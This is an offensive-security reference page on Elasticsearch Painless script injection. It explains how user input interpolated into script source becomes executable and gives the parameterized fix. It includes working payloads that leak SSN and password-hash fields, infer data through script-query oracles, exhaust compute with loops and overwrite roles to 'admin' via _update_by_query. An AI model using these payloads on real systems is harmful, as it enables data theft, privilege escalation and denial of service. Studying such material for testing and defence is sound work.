---
title: "Elasticsearch Painless script injection"
description: "When user input is interpolated into Painless script source in script_fields, script queries, sorts, or updates, an attacker reads arbitrary document data and runs code inside the scripting sandbox."
keywords:
  - Painless injection
  - script_fields
  - script query
  - script injection
  - Elasticsearch scripting
  - sandbox escape
---

# Script injection

Painless is Elasticsearch's default scripting language, reachable through `script_fields`, `script` queries, script-based sorting, `function_score`, and `_update` / `_update_by_query`. When an application builds a script by **interpolating user input into the script source string** rather than passing it as a bound parameter, the input becomes executable Painless, giving an attacker computed data disclosure and code execution within the scripting sandbox.

Scripting must be enabled for these sinks. Stored and inline Painless are on by default in many deployments, though `script.allowed_types` / `script.allowed_contexts` may restrict them.

## Vulnerable pattern

```js
const body = {
  query: { match_all: {} },
  script_fields: {
    calc: { script: { source: `doc['price'].value * ${userInput}` } }
  }
};
```

The intended `userInput` is a multiplier, but it is concatenated into source. A value of `0; return doc['ssn'].value` (or any valid Painless expression) is parsed and run.

## Data disclosure via computed fields

The simplest abuse returns fields the query was never meant to expose, computed per hit:

```json
{
  "query": { "match_all": {} },
  "script_fields": {
    "leak": { "script": { "source": "doc['password_hash'].value" } }
  }
}
```

Script source that references `doc['field']` reads any indexed field with `doc_values`, bypassing `_source` filtering the application relies on.

## Scripted conditions as an oracle

A `script` query evaluates a boolean per document. Injected source turns the search into an inference primitive:

```json
{
  "query": {
    "script": {
      "script": {
        "source": "doc['role'].value == 'admin' && doc['secret'].value.length() > 40"
      }
    }
  }
}
```

Hit-count differences leak attributes of documents without returning them directly.

## Reaching the sandbox

Painless is sandboxed, but injected source can still exercise the allowed API surface: string and collection manipulation, reflection-limited calls, and regex. Catastrophic regex or large-loop source causes compute exhaustion:

```painless
int x = 0; for (int i = 0; i < 100000000; i++) { x += i; } return x;
```

Where the deployment exposes additional contexts or an older build with a weaker allow-list, the same interpolation point is the foothold for sandbox-escape chains that reach `Runtime` or filesystem APIs; the injection mechanism (unbound source) is identical regardless of how far the sandbox can be pushed.

## Injection through updates

`_update_by_query` runs Painless with write access to `ctx._source`, so an interpolated update script mutates documents:

```json
POST /users/_update_by_query
{
  "query": { "term": { "name": "victim" } },
  "script": { "source": "ctx._source.role = 'admin'" }
}
```

If the application builds the `source` from input (for example a "set field X to Y" feature), the attacker overwrites arbitrary fields on arbitrary documents.

## The parameterization tell

Safe code passes values through `params` (`"source": "doc['price'].value * params.m", "params": { "m": userInput }`) so input never reaches source. Offensively, the indicator is any `script.source` containing string concatenation, template literals, or format placeholders fed from request data.

## Tools

- **curl**: submit script_fields and _update_by_query bodies with injected Painless source.
- **Burp Repeater**: craft requests that interpolate Painless payloads into the sink.

## References

- [Elasticsearch: How to use scripts](https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-scripting-using.html)
- [Elasticsearch: Painless scripting language](https://www.elastic.co/guide/en/elasticsearch/painless/current/painless-guide.html)
- [Elasticsearch: Script fields](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-fields.html#script-fields)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
